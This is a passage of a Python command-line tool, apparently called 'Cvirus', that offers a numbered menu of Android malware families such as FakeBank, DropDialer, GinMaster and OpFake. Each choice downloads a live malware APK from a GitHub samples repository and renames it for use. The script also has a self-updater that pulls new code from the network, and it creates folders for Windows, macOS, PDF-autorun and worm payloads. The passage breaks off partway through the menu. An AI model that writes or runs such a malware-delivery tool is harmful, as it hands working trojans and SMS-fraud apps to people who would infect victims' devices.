#!/usr/bin/python
try:
	import optparse, os, sys, time, random
	from time import sleep
	if sys.version_info.major <= 2:import httplib
	else:import http.client as httplib
	os.system('clear')
	try:
		import colorama
		from colorama import Fore, Back, Style
	except (ImportError,ModuleNotFoundError):
		print('[Err] You are missing colorama module')
		sleep(2)
		print ('[solution] Install by typing "pip install colorama"')
		exit()
	colorama.init(autoreset = True)
	green = Style.RESET_ALL+Style.BRIGHT+Fore.GREEN
	carol = Style.RESET_ALL
	white = Style.RESET_ALL+Style.BRIGHT+Fore.WHITE
	magenta = Style.RESET_ALL+Style.BRIGHT+Fore.MAGENTA
	yellow = Style.RESET_ALL+Style.BRIGHT+Fore.YELLOW
	red = Style.RESET_ALL+Style.BRIGHT+Fore.RED
	blue = Style.RESET_ALL+Style.BRIGHT+Fore.BLUE
	versionPath = "Main"+os.sep+"version.txt"
	coli = [green,white,magenta,yellow,red,blue]
	logo = """       .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  MACHINE   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `  g1ng3rb1t3  ' 
"""
	print(random.choice(coli)+""+logo)
	if not os.path.exists('Android'):
		os.makedirs('Android')
	if not os.path.exists('Macosx'):
		os.makedirs('Macosx')
	if not os.path.exists('Shell-virus'):
		os.makedirs('Shell-virus')
	if not os.path.exists('Pdf-autorun-windows'):
		os.makedirs('Pdf-autorun-windows')
	if not os.path.exists('Windows'):
		os.makedirs('Windows')
	if not os.path.exists('Worm-and-Bombzip'):
		os.makedirs('Worm-and-Bombzip')
	
	try:
		import tqdm
		from tqdm import tqdm
	except (ImportError,ModuleNotFoundError):
		print('{}[{}Err{}] {}You are missing tqdm module'.format(blue,red,blue,white))
		sleep(2)
		print ('{}[{}solution{}] {}Install by typing "pip install tqdm"'.format(blue,green,blue,white))
		exit()
	try:
		import requests
	except (ImportError,ModuleNotFoundError):
		print('{}[{}Err{}] {}You are missing requests module'.format(blue,red,blue,white))
		sleep(2)
		print ('{}[{}solution{}] {}Install by typing "pip install requests"'.format(blue,green,blue,white))
		exit()
	class Infectar(object):
		@staticmethod
		def info():
			kevo = (""""""+white+"""["""+yellow+"""×"""+white+"""]"""+blue+""" Author"""+green+""" =>"""+red+""" Kevo"""+white+"""("""+magenta+"""g1ng3rb1t3"""+white+""")
"""+white+"""["""+yellow+"""×"""+white+"""]"""+blue+""" Telegram """+green+"""=>"""+red+""" https://t.me/iamk3lv1n
"""+white+"""["""+yellow+"""×"""+white+"""]"""+blue+""" Facebook page"""+green+""" =>"""+red+""" https://m.facebook.com/Python-PHP-Cpp-257950141859987/
"""+white+"""["""+yellow+"""×"""+white+"""]"""+blue+""" Facebook personal"""+green+""" =>"""+red+""" https://www.facebook.com/profile.php?id=100055220900345
"""+white+"""["""+yellow+"""×"""+white+"""]"""+blue+""" Instagram """+green+"""=> """+red+"""https://www.instagram.com/iamk3lv1n
"""+white+"""["""+yellow+"""×"""+white+"""]"""+blue+""" GitHub """+green+"""=> """+red+"""https://www.github.com/g1ng3rb1t3
"""+white+"""["""+yellow+"""×"""+white+"""]"""+blue+""" WhatsApp """+green+"""=>"""+red+""" https://wa.me/254769161106""")
			print(kevo)
		@staticmethod
		def update():
			if not os.path.isfile(versionPath):
				print("\n{}[{}Err{}] {}Can't check for updates".format(blue,red,blue,white))
				sleep(2)
				print('{}[{}solution{}]{} Reclone The Script'.format(blue,green,blue, white))
				sleep(1)
				exit()
			try:
				print("{}[+]{} Checking for updates...".format(blue,green))
				conn = httplib.HTTPSConnection("raw.githubusercontent.com")
				conn.request("GET", "/g1ng3rb1t3/Cvirus/master/Main/version.txt")
				repoVersion = conn.getresponse().read().strip().decode()
				with open(versionPath) as vf:
					currentVersion = vf.read().strip()
				if repoVersion == currentVersion:write("{}[{}g.news{}]{} The script is up to date!\n".format(blue,green,blue,white))
				else:
					print("{}[{}g.news{}] {}An update has been found!!".format(blue,green, blue,white))
					sleep(2)
					print('{}[+] {}Please wait!!! Updating'.format(blue,white))
					conn.request("GET", "/g1ng3rb1t3/Cvirus/master/main.py")
					newCode = conn.getresponse().read().strip().decode()
					with open("main", "w") as CvirusScript:
						CvirusScript.write(newCode)
					with open(versionPath, "w") as ver:
						ver.write(repoVersion)
					print("{}[{}g.news{}]{} Successfully updated ^-^\n".format(blue,green,blue,white))
			except:
				print("{}[{}Err{}]{} Can't connect to internet".format(blue,red,blue,white))
		@staticmethod
		def android():
			print('{}[{}01{}] {}Agent\t\t\t\t{}[{}21{}] {}Cat'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}02{}] {}Badnews\t\t\t\t{}[{}22{}] {}ChistesCortos'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}03{}] {}Bios\t\t\t\t{}[{}23{}] {}Chistepicanticos'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}04{}] {}BlatanSMS\t\t\t\t{}[{}24{}] {}FunnyYs'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}05{}] {}BrainTest\t\t\t\t{}[{}25{}] {}Image Pets'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}06{}] {}Claco\t\t\t\t{}[{}26{}] {}Kitchen'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}07{}] {}DropDialer\t\t\t\t{}[{}27{}] {}Laughter'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}08{}] {}FakeBank\t\t\t\t{}[{}28{}] {}Prasesamor'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}09{}] {}FakeCMCC\t\t\t\t{}[{}29{}] {}PrasesFee'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}10{}] {}FakeDoc\t\t\t\t{}[{}30{}] {}RecipeSmart'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}11{}] {}FakeValidation\t\t\t{}[{}31{}] {}RomaticPoss'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}12{}] {}Fobus\t\t\t\t{}[{}32{}] {}StateSSS'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}13{}] {}GinMaster\t\t\t\t{}[{}33{}] {}ThinKing'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}14{}] {}Masnu\t\t\t\t{}[{}34{}] {}Crd'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}15{}] {}Elite\t\t\t\t{}[{}35{}] {}Dendroid'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}16{}] {}Omigo\t\t\t\t{}[{}36{}] {}Ds'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}17{}] {}OpFake\t\t\t\t{}[{}37{}] {}Facebook'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}18{}] {}Sms Worker\t\t\t\t{}[{}38{}] {}Fake_Av'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}19{}] {}Vietcon\t\t\t\t{}[{}39{}] {}ADware'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}20{}] {}Candy Corn\t\t\t\t{}[{}40{}] {}Mp3Player'.format(blue,red,blue,yellow,blue,red,blue,yellow))
			print('{}[{}tip{}] {}Ctrl+c to exit\t\t\t{}[{}41{}] {}Settings'.format(blue,red,blue,white,blue,red,blue,yellow))
			andro = input('{}[{}choice{}] >>>>> {}'.format(white,blue,white,green))
			if andro in('1','01'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Agent.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'Agent.apk?raw=true' Android/Agent.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Agent.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro in('2','02'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/BadNews.A.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'BadNews.A.apk?raw=true' Android/BadNews.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}BadNews.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro in('3','03'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Bios.NativeMaliciousCode.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'Bios.NativeMaliciousCode.apk?raw=true' Android/Bios.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Bios.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro in('4','04'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Blatantsms.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'Blatantsms.apk?raw=true' Android/Blatantsms.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Bios.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro in('5','05'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/BrainTest.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'BrainTest.apk?raw=true' Android/BrainTest.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}BrainTest.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro in('6','06'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Claco.A.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'Claco.A.apk?raw=true' Android/Claco.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Claco.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro in('7','07'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Dropdialer.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'Dropdialer.apk?raw=true' Android/DropDialer.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}DropDialer.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro in('8','08'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeBank.B.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'FakeBank.B.apk?raw=true' Android/FakeBank.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}FakeBank.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro in('9','09'):
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeCMCC.A.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'FakeCMCC.A.apk?raw=true' Android/FakeCMCC.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}FakeCMCC.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '10':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeDoc.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'FakeDoc.apk?raw=true' Android/FakeDoc.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}FakeDoc.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '11':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeValidation.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'FakeValidation.apk?raw=true' Android/FakeValidation.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}FakeValidation.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '12':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Fobus.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'Fobus.apk?raw=true' Android/Fobus.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Fobus.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '13':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/GinMaster.Z.AdvancedObfuscation.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'GinMaster.Z.AdvancedObfuscation.apk?raw=true' Android/GinMaster.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}GinMaster.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '14':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Masnu.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'Masnu.apk?raw=true' Android/Masnu.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Masnu.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '15':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Minecraft2.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'Minecraft2.apk?raw=true' Android/Elite.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Elite.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '16':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Omigo.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'Omigo.apk?raw=true' Android/Omigo.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Omigo.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '17':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Opfake.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'Opfake.apk?raw=true' Android/Opfake.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Opfake.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '18':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/SmsWorker.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'SmsWorker.apk?raw=true' Android/SmsWorker.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}SmsWorker.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '19':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Vietcon.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'Vietcon.apk?raw=true' Android/Vietcon.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Vietcon.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '20':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/candy_corn.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'candy_corn.apk?raw=true' Android/Candycorn.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Candycorn.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '21':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/cat.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'cat.apk?raw=true' Android/Cat.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Cat.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '22':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/chistescortos.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'chistescortos.apk?raw=true' Android/Chistescortos.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Chistescortos.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '23':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/chistespicanticos.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'chistespicanticos.apk?raw=true' Android/Chistespicanticos.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}Chistespicanticos.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '24':
				try:
					chunk_size = 1024
					url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.funnyys.apk?raw=true'
					r = requests.get(url, stream = True)
					size = int(r.headers['content-length'])
					filename = url.split('/')[-1]
					with open(filename, 'wb') as f:
						for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
							f.write(data)
					os.system("mv 'com.funnyys.apk?raw=true' Android/ComFunnys.apk")
					print('{}[{}G.news{}] {}Download success ^-^'.format(blue,green,blue,white))
					sleep(2)
					print('{}[{}tip{}] {}Check virus on Android folder'.format(blue,yellow,blue,white))
					sleep(1)
					print('{}[{}tip{}] {}File name = [{}ComFunnys.apk{}]'.format(blue,yellow,blue,white,magenta,white))
					exit()
				except:
					print('{}[{}Err{}] {}Some Error occured!!!'.format(blue,red,blue,white))
					sleep(2)
					exit()
			elif andro == '25':
				try:
